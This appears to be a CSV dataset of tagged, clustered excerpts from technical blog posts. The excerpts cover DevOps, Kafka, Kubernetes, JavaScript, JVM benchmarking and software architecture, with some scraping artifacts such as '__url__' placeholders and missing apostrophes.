2735,"Login to 10.17.153.112 and do the following-Make a new directory for zookeeper data and navigate inside it using following command2. Create a new file at this location called myid which should contain the serial number of the server. This indicates that server 10.17.153.112 is the 1st server of zookeeper ensemble.3. Rename zoo_ __url__ to __url__ in conf folder of zookeeper4. comment data Dir and client Port in __url__ file by prepending the lines with #5. Now let us spin up the zookeeper instance by invoking the zk S __url__ file in bin of zookeeper8. Repeat steps 1 to 7 on every server you wish to install zookeeper on. Except in step 2, you should echo the server number on each one of them. 2 will be echoed on server 10.17.152.145 and 3 will be echoed on server 10.17.152.145. In this case all three servers will have zookeeper as well as solr.9. Ensure that there are no major errors in the log file using Now that zookeeper ensemble is setup, lets spin up Solr instances also.","['DevOps', 'Solr', 'Apache Solr', 'Zookeeper', 'NoSQL']",7
2736,"Some sites are not responding, and I havent set a timeout, wed better do that: Weve applied a short (5 second) timeout, and a catch for any URL that doesnt respond in that time. This is great, because it means the script should complete in a reasonable time, but it also introduces our first bit of uncertainty into the processwhat if a URL does resolve, but for some reason it takes 6 seconds to respond? Does a URL have to be responsive to be considered valid, and if not, how long should you have to wait to find out if it resolves? Pushing those questions aside for the moment, lets push on and get our script to complete. Over and over I ran it, each time getting a little further before encountering a new error, which I added to the list of excepts. I wont bore you with the details, and in the end our exception handling looks like this: Theres a few new things to unpack here: Connection Error is some non-specific issue with connecting to the URL. It acts as a bit of a catch-all for where a more-specific error doesnt exist Invalid Schema means our URLs are actually wrong, like someone misspelled http as htp or somesuch Missing Schema means our URLs are totally missing the http(s) part Too Many Redirects means that each time requests asked for the site it got a response with a 3xx status code which redirected us to another URL which also offered a 3xx status code and so on and so on until requests decided that it was being given the run around and gave up.","['Links', 'Validation', 'Urls', 'Http Request', 'Python']",11
2737,"If you are going to deploy your application in an Environment like Kubernetes managing logging is a task you should put much thought into. A pod is not like a bare-metal machine or a VM. Its lifecycle is managed by Kubernetes cluster. Pods can be restarted, rescheduled at any time. If that is the case how can we find what went wrong? There can be hundreds of servers to monitor. Isnt nice to have a centralized location to monitor all servers? Logs mean events which describe the system state. How do gonna find anything efficiently from these thousands of events? This where Centralized logging system coming to picture. Centralized logging answers all concerns raised above. Basically, Centralized logging system is a single place where your all logs are managed. Each server publishes their logs to a central location and you can use advanced searching techniques, alerting to manage them.","['Docker', 'Kubernetes', 'Elasticsearch', 'Kibana', 'Logstash']",11
2738,"WSO2 APIM server is a java application which writes its logs to a file. Logstash is the bridge between Elasticsearch and the Main server. Logstash reads the logs file and converts each event to a structured format(JSON) which Elasticsearch understand and can handle. When it comes to Java logs, it is not as easy as it sounds. There are multiple log lines for error(stack trace) and a single line for simple info. We have to handle both scenarios. Gork filter plugin is used to parse loglines and Multiline codec plugin is used to identify a log event which has multiple log lines.","['Docker', 'Kubernetes', 'Elasticsearch', 'Kibana', 'Logstash']",7
2739,"Lets begin by discussing why we did this and what we hoped to achieve. The goal was to reduce the number of flaky tests in our codebase to near zero. Because flakes are bad, they: Screw up our CI pipelines Make refactoring difficult and error-prone Lead to reduced confidence in the codebase Make me feel like an amateur who doesnt know how to write good tests Waste valuable engineering time Are just generally are the worst And wed had quite enough of all that. But before we could deal with the flakes we first needed to flush them out. And what better way to flush them out than by running all our test suites periodically every 20 minutes forever! This was the genius idea of the teams Anchor at the time, Will Martin, who then immediately stepped down as Anchor and left me to deal with the fallout.","['Continuous Integration', 'Testing', 'Golang', 'Cloud Foundry', 'Containers']",13
2740,"Heisenflakes are the worst of all flakes. They are impossible to reproduce and occur only once in a lifetime. We literally had to investigate a flake that would occur once in every ~3000 runs. The pattern weve adopted for dealing with Heisenflakes is to not even try to reproduce them, as, by definition, they will not occur when you are trying to debug them. Instead we focus on improving our logging/debug output so that we are in a better position to understand the flake if/when it ever occurs again. This has saved us many, many hours of painfully boring debug time over the past year or so.","['Continuous Integration', 'Testing', 'Golang', 'Cloud Foundry', 'Containers']",13
2741,"Its a key point for every project (specially AGILE project): which architecture should I choose, which platform and third parties should I use. The most common things are predefined by tech consultants just before you start (it would be a real stroke of luck for you if this tech guy that took a decision is intimate and knowledgeable regarding mobile development). Answers for many obtuse questions are based on myths and required by non-technical management. The question about the project architecture is the first in line. The truth is that nobody knows from the beginning which architecture suits their project best. In most cases the right answer would be to suggest a few variants in order to choose one during a brainstorming session.","['Software Development', 'Refactoring', 'Android App Development', 'Project Management', 'Android Architecture']",12
2742,"Many developers complain that there is no time for this, I partially agree with them. When you just started a project from scratch and your goal is just to get a proof of concept or even MVP you can avoid tests during development. As per usual, its a small single module MVC project, based on a well tested third party implementation with a few lines of your own code that can be debugged easily. Here are some good to know alternatives for test driven development in this case:probe and fails with visual evaluation (students approach);debugging your code and using Android Studio profiler;log application steps and actions using Log Cat;small proof-of-concept projects/sandboxes;static analysers;integrated third parties (Crashlytics, Leak Canary, Debug Drawer, Chuck,Sherlock);With a rise of project complexity, isolated tests are the cheapest solution. On the other hand, Test Driven Development coupled with Data Driven Development demand certain architectural solutions, which is impossible to get when dozens of functionalities have already been done. We started from Instrumentation Tests 2 (dropped now) and Espresso and then migrated to Robolectric, UI Authomator and Apium. In our project we had a typical situation when Android design for the new feature was late by at least 2 weeks and we should have started from API endpoints that were ready at that moment. Data driven development demanded lots of tests before we saw the final design implemented and it was the main reason why we started TDD just at MVP phase and at the same time, tech consultants on the client side suggested that we avoided that. In my opinion, without TDD we couldnt be 99,5% crash free from the start.","['Software Development', 'Refactoring', 'Android App Development', 'Project Management', 'Android Architecture']",13
2743,"Here is one more important thing I want to add to collaboration topic. You see, all this instruments cannot substitute live communications between developers. On my opinion, it is really when all developers are located at the same place. We found that each one rise his productivity on at least 2030% when joined team in comparison with distance work. But again, its only my opinion and subjective filling on certain project.","['Software Development', 'Refactoring', 'Android App Development', 'Project Management', 'Android Architecture']",1
2744,"First, we notice this object is describing relationships, cascade deletion and nullable attributes. Exactly what you would expect from an Object-Relational Mapper. Next, lets consider for a moment. What is important for us when representing an Article? : We should be able to harness the full power of the language we are using. When we are using Java, we want to be able to use OO patterns and inheritance freely. When we are using Haskell, we want to use union types and records.","['Software Development', 'Web Development', 'Software Design Patterns', 'Code', 'Programming']",9
2745,"The virtual DOM is a somewhat ubiquitous abstraction in modern web development. Beyond the culture-of-cool in web development that requires some great new thing every year to replace the old great new thing that we now all realize sucks, the virtual DOM is an abstraction that leads to one key breakthrough in developing UIs the ability to write purely functional UI code. A quick example of why this is great (without getting into a FP v OOP flame war) is that it makes your UI code declarative. Your UI code no longer needs to define changes to the UI, just declare what the UI should be based on the current application state. In the purest sense your application UI becomes a pure function of state -> virtual DOM. This is both an easy to understand function and an easily unit-testable function.","['JavaScript', 'Typescript', 'Web Development', 'Functional Programming', 'Virtual Dom']",19
2746,"To get things started Im going to define some parameters around what we will be building. These pieces will be familiar if youve used virtual DOM libraries. The piece I have already mentioned is that the virtual DOM allows us to write declarative and pure code. An actual DOM node isnt pure, it exists outside of our application. Any other Java Script loaded on the page can manipulate it. For example, many common grammar plugins add classes and insert messages for the user when they are typing in textareas or input boxes. Real DOM nodes also contain circular references. They typically have a reference to the document they are contained in and the document itself then has references to all of its children. This makes them a little trickier to test equality (Its much easier to write a deep Equal function that doesnt account for circular references, also you cant JSON.stringify an object with circular references). Usually, in your application, you dont need all of this complexity. What do you need to represent the DOM node you want to create? Something like this is about it. So then, in your application, if you had some function named view that took the application state (another simple object) and returned an object like this its very easy to test that view is being updated the way that you expect based on changes to your application state.","['JavaScript', 'Typescript', 'Web Development', 'Functional Programming', 'Virtual Dom']",15
2747,"There is no such thing as a completely pure application. Strike that, there is no such thing as a completely pure useful application. Without at least some I/O there would be no way to know what the function did. When you are keeping your application as pure as possible you are making more of your code easily testable and easier to reason about. It is easier to describe (document) what a function does if it just takes some input and returns some output. If, instead, it goes off and performs I/O, updates the DOM based on some conditions around the current state of the DOM, or sends some data off to some outside source it becomes much harder to test and document.","['JavaScript', 'Typescript', 'Web Development', 'Functional Programming', 'Virtual Dom']",9
2748,"I will be writing all of my source in src/main/ and all of my tests in src/tests. This may feel a little Java-ish, but its an organization pattern that works for me. If you like something else, please do that, just update any scripts I give you that rely on these paths. That should get us going for now. Well be adding to this as we go, but, as I said, Im impatient.","['JavaScript', 'Typescript', 'Web Development', 'Functional Programming', 'Virtual Dom']",6
2749,"For a long time, cookies were the main way to store information about users visiting your app or website. They were used to record stateful elements like shopping cart items or options changed by a user. They were also used to remember user browsing habits or to keep a user logged in while they went from page to page. Then, HTML5 appeared on the scene and introduced Local Storage as another data storage option. This new Javascript object (along with Session Storage) boasted a much large storage capacity than cookies at a whopping 5MB. In this article, we will compare and contrast cookies and Local Storage.","['JavaScript', 'Cookies', 'Web Applications', 'Web Development', 'Browsers']",17
2750,"Cookies Small, but Mighty First, well start by exploring basic information about cookies. Well also go over some of their pros and cons. According to whatarecookies.com, they are small text files that are placed on a users computer by a website. They hold a very small amount of data at a maximum capacity of 4KB. Cookies are used in different ways, such as in storing the pages visited on a site or a users login information. They are limited in that they can only store strings.","['JavaScript', 'Cookies', 'Web Applications', 'Web Development', 'Browsers']",17
2751,"Local Storage A More Permanent Solution After HTML5 came out, many uses of cookies were replaced by the use of Local Storage. This is because Local Storage has a lot of advantages over cookies. One of the most important differences is that unlike with cookies, data does not have to be sent back and forth with every HTTP request. This reduces the overall traffic between the client and the server and the amount of wasted bandwidth. This is because data is stored on the users local disk and is not destroyed or cleared by the loss of an internet connection. Also, as mentioned before, Local Storage can hold up to 5MB of information. This is a whole lot more than the 4KB that cookies hold.","['JavaScript', 'Cookies', 'Web Applications', 'Web Development', 'Browsers']",17
2752,"Before we jump into the juicy details, lets quickly review how Kafka works and stores its information. A Kafka cluster is made up of one or more Kafka brokers. Kafka clusters contain topics, that act like a message queue where client applications can write and read their data. Topics are divided into partitions and these partitions are distributed among the Kafka brokers. The brokers do not usually own all the partitions for all the topics. They only get to have some partitions per topic.","['Kafka', 'Apache Kafka', 'Kafka Topic', 'Big Data']",8
2753,"Even though we were using a compact,delete policy with a one-week retention period, we were seeing messages several months old. Well, as the name of the policy implies, Kafka will first run the compact process and then the delete process. Compaction works by analyzing the whole segment and leaving only the latest entry for each message key. In order to avoid having multiple smaller segments, the compact policy will merge them.","['Kafka', 'Apache Kafka', 'Kafka Topic', 'Big Data']",3
2754,"The described behavior has the following consequence. During the compact phase, unrepeated record keys that are at the beginning of the topic, located in the first segments of a partition, will end up being merged with segments that contain newer records. The newer segments, of course, will have keys that are still in the retention time frame. After compaction is finished, Kafka will trigger the delete policy. We already mentioned that this policy thinks in segments, not in individual messages and that it will not delete segments that contain information that has not expired. As the oldest segment contains both old and new keys, it wont be deleted, hence the consumer of this topic will see information that is very old! A workaround for avoiding this corner case is, once again, to reduce the size of segment.bytes.","['Kafka', 'Apache Kafka', 'Kafka Topic', 'Big Data']",3
2755,"From the error, its clear that the code was trying to access a nonexistent serial_number instance method on a Widget object. You know that a class inheriting from Active Record:: Base will automatically have instance methods for any columns in the corresponding DB table, so you should only see an error like this if the serial_number column doesnt exist in the DB. But the new code you shipped included a migration to create that column. The issue is that deploying new code to production and running any corresponding migrations is not an atomic operation. The details may vary depending on your production environment, but on our team, this process is non-atomic in two separate respects:1. Our production environment consists of multiple dynos (virtual webservers) managed by Heroku. To avoid downtime, we use a special Heroku feature called preboot that implements a so-called blue-green deployment approach. Long story short: for a few minutes while were deploying, both the old code and the new code are handling traffic simultaneously. Some dynos have the old code, and others have the new code.2. DB migrations may complete after one or more dynos running the new code have already begun serving traffic.","['Ruby on Rails', 'Rails', 'Database', 'Software Engineering']",7
2756,"Im not a terribly big fan of mocks. For one thing, mocks are an artificial simulation of some result. Mocks are only as good as our imagination and our ability to predict the various failure modes our application might encounter. Mocks are also very likely to get out of sync from the real service they stand-in for, unless one painstakingly tests every mock against the real service. Mocks also work best when there is just a single instance of every particular mock and every test uses the same mock.","['Programming', 'Abstraction', 'Software Development', 'Software Engineering', 'Coding']",13
2757,"The story started in my second year. I was a complete newbielooking up tutorials on You Tube and calling myself a hacker. Hell, I couldnt even dual boot a PC properly. Back in school, I wasnt very good with computers. Maybe it was because of the curriculum or the intensive JEE coaching, but I never really had any motivation to explore programming. Things changed when I joined IIT and got my own laptop. My curiosity, eagerness to explore and my very talented friends sure took me a long way.","['Security', 'Hacking', 'Microsoft', 'Information Security', 'Bug Bounty']",2
2758,"Back to the story, it all started when I saw a notice board in the college campus. Three words caught my attention: hacking contest, Microsoft and goodies. Needless to say, these were sufficient to get the second year me excited. It was a group event, so I teamed up with two of my close friends. The rules were thus: a 24-hour preliminary round followed by the top 50 teams battling it out in the finale at the Microsoft Hyderabad campus. The glitch here was that only three teams per college could qualify.","['Security', 'Hacking', 'Microsoft', 'Information Security', 'Bug Bounty']",2
2759,"So the moment came again in my 3rd year. I formed a team with my friends Midhul Varma, Nikhil Alamanda and Venkat Arun. This time it was quite a different story. We called our team Cereal Killers. Dont ask how we came up with it, but the name has stuck on ever since. The screenshot of the leader-board below was taken just 1 hour into the contestwe were at the top. Midhul and I decided to take a hint for a silly question which deducted 50 points for us and landed us at the 6th position.","['Security', 'Hacking', 'Microsoft', 'Information Security', 'Bug Bounty']",6
2760,"Fast forwarding one week, the Platform team starts to notice that a user in a restricted namespace has been reading secrets from other namespaces. Well, they did, but as with code, we need to test our systems against the desired outcome. Thankfully Kubernetes CLI tool kubectl provides us with tooling that allows us to test our RBAC configuration. kubectl auth can-ican-i simply checks that with the API to see if an action can be performed. It can take the following options kubectl auth can-i VERB [TYPE | TYPE/NAME | NONRESOURCEURL]. And now it is possible for the current user to check whether to not they can perform an action. Let's give this a go: This should return a yes or a no with a corresponding exit code.","['Kubernetes', 'Open Source', 'Software Engineering', 'Rbac', 'API']",11
2761,"Making a new web app from top to bottom today is filled with choices we didnt have to make even a few years ago. Cluster computing has gone from being a specialty case for things like Hadoop map-reduce to a viable environment for an HTTP API service that wed normally just throw on a bare metal server or VM, either on-premises or externally hosted, and call it a day. The No SQL vs SQL debates rage on after almost a decade of Mongo, Redis and other popular stores. HTTP API designs that were to have been automated for simple CRUD by services like Parse in the past and libraries like Graph QL today continue to be debated. The very notion of using a framework to run an always-on HTTP server has been called into question by the Serverless approach of on-demand HTTP request handlers that come up and down instantly thanks to the power of containers. Single Page Application (SPA) frameworks like Angular, React and Vue have come to the forefront to help build pages with complex state transitions. The eternal debate of monoliths versus microservices continues. Web Assembly threatens to finally realize the dream of running near-native code in the browser. Newer languages like Crystal, Elixir, Go, Rust and Scala challenge the dominance of mainstays like Java and Python. And through this wide and seemingly endless playing field is a depth of nuance between related and competing approaches to handle everything.","['Software Development', 'Web Development', 'Programming']",10
2762,"Historyish (very, very loosely)Hosting a web server has changed quite a bit. Static files were once hosted on a relatively static server like Apache and served straight-up. Then dynamic handling of requests became a thing with Perls CGI, Pythons WSGI, Java Servlets and so forth. Once server-side languages became a thing, library and external service dependencies began to complicate consistent deployments. Over the years, tools like Puppet, Chef and Ansible came out to assist in recreating environments. Bare metal servers began to be replaced by virtual machines.","['Software Development', 'Web Development', 'Programming']",10
2763,"Amazon Web Services (AWS) became a go-to place for setting up web apps that required databases, queues and other common needs. Heroku, powered by AWS, introduced the 12-factor app methodology to the general public. Other services like Googles Cloud Platform (GCP) arose to compete with AWS, and Microsoft came in a bit later in the game with their Azure service. Now, setting up a database and deploying a web app had to be handled in similar but incompatible ways depending on the exact platform youre running on and the situation youre in. AWS provided ways to deal with autoscaling, but these were AWS-specific. There have been numerous ways for dealing with deployment using things like Elastic Beanstalk, Cloud Formation and so forth. And while these all work, it often feels like were repeating the same things in slightly different ways.","['Software Development', 'Web Development', 'Programming']",10
2764,"As containers and web services continued to take off, some very intelligent people realized that scheduling programs for execution in a cluster wasnt as efficient as it could be. They proposed a new way called Dominant Resource Fairness (DRF) which worked to maximize the smallest dominant share in the system (e.g. This ensured the best use of resources, and encouraged users of a cluster not to lie about their needs. And thus Mesos was born, an open source cousin of Googles Borg. Twitter made great use of Mesos to scale up their systems, which brought it into the public eye. They built Aurora on top of Mesos for scheduling long-running jobs.","['Software Development', 'Web Development', 'Programming']",10
2765,"OS-level virtualization has been around since at least the year 2000 with Free BSD jails, but Linux containers didnt come around until 2008, and as Linux was the predominant choice for webservers, this brought them into view, but it wasnt really until Docker came around in 2013 that it became simple enough for people to use. The Docker image was the biggest change. Until then, if on AWS, a common scenario was to write a script to recreate an environment based on an existing Amazon Machine Image (AMI), produce a new one, and use this as the template going forward. However, developing these images was a costly endeavor, because if anything failed during running a script, it was difficult to go back to the point of failure and fix the issue. Instead, it was safer to re-run the entire build to the point of failure to ensure reproducibility. Also, if creating an image to similar to one before, unless you carefully created a new image for each step of your build, reusing pre-existing images wasnt a thing (Dockers layered images made this easy and efficient). Similar issues surrounded creating virtual machines from scripts, as was the case with Chef and Vagrant. Running a container based on a Docker image was also made easy, allowing for the dynamic choice of which port to expose at runtime. Creating a central image repository, while also a great business model, helped to solve the issue of how to pull the images to the right place when needed. Oh, and none of this required running on a specific hosting provider.","['Software Development', 'Web Development', 'Programming']",7
2766,"Fine, but why containers over VMs or bare metal? This has been answered widely all over the web, so Ill just give my own subjective personal take on it. When deploying a new version of a server software to servers, if isolation and reproducibility are desired, then a VM is usually instantiated, then set up from a script, before being made available. For Docker, an image is created based on a script (Dockerfile), but only the changed parts, typically the updated source code of the server software, are run, which are relatively quick. The startup time for a container is faster than that of a VM as well. In the event of a failure along the way, shutting down a container is also generally faster. If youre paying for hosting of all of this, the compute time will be less, and should translate to less money.","['Software Development', 'Web Development', 'Programming']",10
2767,"Bare metal is desirable for cases where relatively constant, high throughput is desired, such as with a database like Postgre SQL. Setting things like caches to be writethrough (WT) instead of writeback (WB) in the kernel to avoid data loss of the Write Ahead Log (WAL) is not typically possible in a container, and the reason is obvious: multitenancy. If caches are set to WT for the DB, other apps depending on WB caches for performance that are running on the same physical machine will suffer. This is a breaking of isolation. Docker does support setting some kernel parameters but not all, so if your use case is not covered, then a VM or bare metal may be the way to go. By definition, VMs and containers can never beat the performance of bare metal, or its configurability. If security is a concern, and one is paranoid of a container or VM breaking isolation somehow, this is a way to allay those fears as well (though of course the box itself may be hacked).","['Software Development', 'Web Development', 'Programming']",11
2768,"It says a lot about the prevalence of SQL-using RDBMSs that the term No SQL has been used to amalgamate such disparate databases as Mongo and Redis. How much time has been spent in writing SQL queries, DDL for schemas, and analyzing performance of queries? How much time has been spent fine-tuning these databases? Using an RDBMS correctly is a difficult and never-ending endeavor, growing and changing with the needs of the database and the applications using it. Many people have been driven insane by all of this, so the dream of never having to deal with these things again in some magical world with no SQL is alluring and tantalizing.","['Software Development', 'Web Development', 'Programming']",8
2769,"Ive seen many cases where relational data is forced into a non-relational system, and the consequences are disastrous. Many No SQL databases offer no ACID guarantees, instead offering eventual consistency which may or may not happen. Great databases such as Redis can handle high throughput and atomicity of pipelined operations, but not semantic consistency of data (this is up to the app developer). One could create something like a SQL column index by using a Sorted Set, for instance, but this must be codified in the app, as Redis has no schemas. Understanding such an app with effective schema logic in the app code rather than the database is a challenge. Similarly, Redis data structures can be used to model relations to perform JOINs but this is inadvisable.","['Software Development', 'Web Development', 'Programming']",8
2770,"Graph QL came about in 2015 from, you guessed it, Facebook. It offered a way to set up a one-size-fits-all DB-based backend API in which the frontend decided what data to query using Graph QLs query language. In a way, this brought even more power to frontend developers, although it also meant that some of the app system logic sits in the frontend. Unlike REST APIs which map resources onto URLs, Graph QL exposes a single HTTP endpoint that can be queried for whatever data that the backend exposes. To avoid several roundtrips, Relay is used to pipeline queries into a single HTTP request. Further, the server can implement response caching to compensate for the loss of GET request caching that happens with most REST APIs. While Graph QL has only limited support for high-depth recursive queries, most apps will not require this.","['Software Development', 'Web Development', 'Programming']",11
2771,"Many websites, it turned out, were applications disguised as a series of web pages, but the web was originally built to be an interlinked set of documents, not an application on-par with desktop apps. Attempts to use libraries like j Query for this, no matter how clean, always hit the same problems. Tracking and modifying state, both in and outside of the DOM (e.g. shadow DOM), was a repetitive and error-prone chore. Eventually, libraries like Angular, Knockout, Ember and others came to address this by effectively replicating what server-side rendering was already doing with models but on the client side. These approaches saw a degree of success, but the more complex a page became, the harder it became to maintain state, and models seemed to not be the right abstraction needed for rendering a tree of DOM elements.","['Software Development', 'Web Development', 'Programming']",19
2772,"In 2013 Facebook released React, which took the learnings of desktop app development into the web, such as unidirectional data flow in a state machine. This time, the abstraction was a component, which consisted of internal state and a method to render the component in JSX, a language resembling the HTML that the component would render to. Now instead of awkwardly trying to map data to models, then models to HTML, there would be a more readily-understood hierarchy of DOM-like elements. Further, rather than force each component to hold all related state and code to update its state, state from high up the hierarchy could be pushed down the hierarchy as a set of properties, further aiding in decoupling code and data flow. Rather than keep track of every possible combination of states, now each component only cares about two things: whats being sent into it, and what it sends to components further down. A similar approach was applied to application state, and libraries like Flux and Redux came about, eventually being used together with React.","['Software Development', 'Web Development', 'Programming']",19
2773,"Backend In the backend the situation is somewhat murkier. Java is perhaps the longest-standing contender for backend language, having had servlets since the languages initial public release in 1996. It remains a force to be reckoned with, as frameworks like Spring and Jersey remain popular, especially in the enterprise, and recent versions of Java have taken learnings from cousins like Scala and continued to improve. Perl, perhaps best known for all those urls ending __url__ circa the year 2000, is still around but has faded somewhat in popularity. In its place as scripting languages of choice are Python and Ruby, with popular frameworks such as Django, Flask, Rails and Sinatra. Javascript has even found a niche in the backend with node.js.","['Software Development', 'Web Development', 'Programming']",19
2774,"Recently, however, theres been a move to more performant, static-typed and functional languages. Riding on the outstanding performance of the JVM, Scala arose as a kind of happy medium between a pure functional language like Haskell and the Object-Oriented Java, with the Play web framework. The Go language, built and heavily backed by Google, offers a performant static-typed imperative language meant to replace C as a systems programming language, but its also finding a big following in web servers. Rust, also a systems programming language, has been growing as well, with server libraries like Hyper and Iron. Elixir, riding Erlangs BEAM VM, has recently come to the fore, with its Rails-like Phoenix framework. Crystal, another Ruby-inspired language, is also making waves with the Rails-like Amber web framework. Finally, Swift, originally from Apple and used on i OS, has begun to see some use in web backends as well, with Vapor, Kitura and Perfect.","['Software Development', 'Web Development', 'Programming']",9
2775,"Ecosystem While all libraries could technically be written in any general purpose language, in practice different industries tend to congregate around one or two languages. Ruby on Rails has a fantastic ecosystem for building monolithic web apps with a supportive community, which makes it a great choice for building web apps. Python is heavily supported by the data science, machine learning and system administration communities, and has a great number of libraries to support those use cases such as Num Py and Tensor Flow. Scala has great tools such as Play and Slick for building web apps, and Apache Spark and others for big data. Java has a great many libraries for almost anything under the sun, which Scala can take advantage of while running on the JVM. Go is performant and backed by Google, with an ever-growing ecosystem. The Rust, Elixir and Crystal ecosystems are still relatively young, but are already used in production and will grow quickly enough.","['Software Development', 'Web Development', 'Programming']",19
2776,"Learning Curve Functional programming and more advanced type theory concepts are making their way into many modern languages, but the more of these are used, the harder it becomes to onboard developers. Languages like Scala and Haskell have a higher barrier to entry because of this. Rusts borrow checker and Gos goroutines and channels also take some effort to adjust to. Of course, once learned, these powerful tools help to write equally powerful and robust code, but the learning is not free. Like it or not, onboarding people takes time, and in some cases, people are not willing or able to learn a new language or concept. Humans cannot be removed from the equation of language choice.","['Software Development', 'Web Development', 'Programming']",9
2777,"In the left menubar of Gaias UI you should be able to find the menu item Vault. Click on it to get to the Vault view. Click on Add Secrets to add a new secret to Gaias Vault. Create now two new secrets: Key: vault-token; Value: root-token Key: vault-address; Value: http://vault:8200Finally, we can go back to the Overview and should now see our pipeline. Click on Start Pipeline to start the pipeline. This should forward you to the arguments view where you have to specify the application name (e.g. nginx:latest), and the number of replicas (e.g.","['Kubernetes', 'Gaia', 'Hashicorp Vault', 'Automation', 'Golang']",7
2778,"This publisher/subscriber pattern grants greater development freedom and easier team collaboration. It is now possible to hot plug/swap blocks of code without redeployment, and developers can easily add multiple subscribers to the same event stream, creating a fan-out structure. One of the most prominent use cases of such structures is real-time data analytics: Traditionally, data analysts process data in batch, usually via auto-generated log files. The application executes a sequence, writes the details to logging agents (as a step of the sequence), and data analytics team extracts insight from them, with an understandable delay. In event-driven systems, however, once connected to the event stream as one of the subscribers, data analytics team can get the data they need in real time without interrupting normal operations. If connected to real-time data processing and warehousing solutions such as Google Cloud Dataflow and Google Big Query, developers can have analysis done in real-time as well.","['Cloud Computing', 'Serverless', 'Google Cloud Platform', 'Appdev']",8
2779,"Breaking the contract of sequential code execution has some serious complications, with the most important being the dissociation of inputs (requests) and outputs (responses). In the world of event-driven computing, requests and responses arrive in two separate dimensions; whoever sends the request are not naturally guaranteed a response. For asynchronous operations it is usually fine: when people post a new photo in their social feeds they usually do not expect it to show up in the feeds of their friends immediately; quick feedback is appreciated but not required. Synchronous operations, however, are a different story. When people open a website, they expect the page to load as quickly as possible; no other actions can be performed until the contents show up. Event-driven computing, unfortunately, does not work well in this scenario, as the request is considered served when the event is published; developers have to manually retrieve the response.","['Cloud Computing', 'Serverless', 'Google Cloud Platform', 'Appdev']",3
2780,"Technical debt is well-known to every developer. No good app starts as a legacy app with spaghetti codeit takes a journey to get there. And many times that journey isnt a very long one. With technology evolving constantly, apps and services written even two years ago can be running with an outdated stack or architecture, that becomes buggy, slow and difficult to maintain with every passing day. Once upon a time the LAMP stack was the de facto stack for web applications, and today its considered legacy. This is true for once cutting edge technologies, from JBoss to VMware. And it will be true for the code you are writing right now.","['Software Development', 'Technical Debt', 'Appsflyer']",16
2781,There are many different choices for a JVM for your Java application. Which would be the best to use? Solid performance research however is difficult. In this blog post Ill describe a setup I created to perform tests on different JVMs at the same time. I also looked at the effect of resource isolation (assigning specific CPUs and memory to the process). My test application consisted of a reactive (non-blocking) Spring Boot REST application and Ive used Prometheus to poll the JVMs and Grafana for visualization. Below is an image of the used setup. Everything was running in Docker containers except Soap UI.,"['JVM', 'Performance', 'Grafana', 'Prometheus', 'Docker']",7
2782,"How can you be sure there is not something interfering with your measures? Of course you cant be absolutely sure but you can try and isolate resources assigned to processes. For example assign a dedicated CPU and a fixed amount of memory. I also did several tests which put resource constraints on the load generating software, monitoring software and visualization software (assign different CPUs and memory to those resources). Assigning specific resources to the processes (using docker-compose v2 cpuset and memory parameters) did not seem to greatly influence the measures of individual process load and response times. I also compared startup, under load and without load situations. The findings did not change under these different circumstances.","['JVM', 'Performance', 'Grafana', 'Prometheus', 'Docker']",3
2783,"Using docker-compose to configure a specific CPU for a process is challenging. The version 3 docker-compose format does not support assigning a specific CPU to a process. In addition, the version 3 format does not support assigning resource constraints at all when you use docker-compose to run it. This is because the people working on Docker appear to want to get rid of docker-compose (which is a separately maintained Python wrapper around Docker commands) in favor of docker stack deploy which uses Docker Swarm and maybe Kubernetes in the future. You can imagine assigning a specific CPU in a potentially multi host environment is not trivial. Thus I migrated my docker-compose file back to version 2 format which does allow assigning specific CPUs to test this. The software to generate load and monitor the JVMs I assigned to specific CPUs not shared by the JVMs processing the load. I used the taskset command for this.","['JVM', 'Performance', 'Grafana', 'Prometheus', 'Docker']",7
2784,"How can you be sure that all measures are conducted under exactly the same circumstances? When I run a test against a JVM and run the same test scenario again tomorrow, my results will differ. This can have various causes such as different CPUs pickup the workload and those CPUs are also busy with other things or Im running different background processes inside my host or guest OS. Even when first testing a single JVM and after the test, test another single JVM, the results will not be comparable since you cannot role out something has changed. For example Im using Prometheus to gather measures. During the second run, the Prometheus database might be filled with more data. This might cause adding new data might be slower and this could influence the second JVM performance measures. This example might be rather far fetched though but you can think of other reasons by measures taken at different times can differ. Thats why I choose to perform all measures simultaneously.","['JVM', 'Performance', 'Grafana', 'Prometheus', 'Docker']",3
2785,"JVM memory usage is interesting to look at. As you can see in the above graph, the Open JDK JVM uses most memory. The garbage collection behavior of Graal VM and Zulu appears to be similar, but Graal VM has a higher base memory usage. Oracle JDK does less garbage collections it appears. When looking at averages the Open JDK JVM uses most memory while Zulu uses the least. When looking at a zoomed out graph over a longer period, the behavior of Oracle JDK and Open JDK seem erratic and can spike to relatively high values while Zulu and Graal VM seem more stable.","['JVM', 'Performance', 'Grafana', 'Prometheus', 'Docker']",3
2786,"The database container is very easy to get up and going. You dont need to have an image for it because it is part of the docker registry. Simply defining the image as postgres:latest means that the image will be downloaded for the container with the most recent version of postgres. If you want a versioned postgres use the version instead of latest. It will run your postgres on 5432, the default postgres port. Once it is up and running you can connect to it the same way that you would the app container.","['Docker', 'Rails', 'Docker Compose', 'Container Orchestration']",7
2787,Mailcatcher is much the same way. If you are not familiar with mailcatcher go read up on it. But it is a simple application for monitoring and intercepting outgoing mail from your application. It even has a simple web based client so you can see what your outbound emails look like. The compose file will download and build the container for you and the 1080 and 1025 ports are mapped for you in docker compose file.,"['Docker', 'Rails', 'Docker Compose', 'Container Orchestration']",7
2788,"docker-compose up --build -d This will look at your compose file and build the containers (you dont need to build each time you run them). It will also run them in daemon mode so you can attach to them at later times of your choosing. You may have wondered about the stdin_open and tty lines in the compose file. They will allow you to attach to a container and debug (byebug). To get your list of container names: docker ps To attach, pick the name of a container and docker attach #{container name} You will see logs as they come through.","['Docker', 'Rails', 'Docker Compose', 'Container Orchestration']",7
2789,"SOA composition using a centralized server (e.g. MSA discourage use of ESB (e.g. Top 5 Anti-ESB Arguments for Dev Ops Teams). On the other hand, Do Good Microservices Architectures Spell the Death of the Enterprise Service Bus?","['Microservices', 'Programming', 'Software Development', 'Software Architecture', 'Software Engineering']",10
2790,"The other extreme is saying that microservices should not call other microservices and all connection should be done via API gateway or message bus. This will lead to a one level tree. For example, instead of the microservice A calling B, we bring result from the microservice A to the gateway, which will call B with the results. Most of the business logic will now live in the gateway. Yes, this makes the gateway fat.","['Microservices', 'Programming', 'Software Development', 'Software Architecture', 'Software Engineering']",10
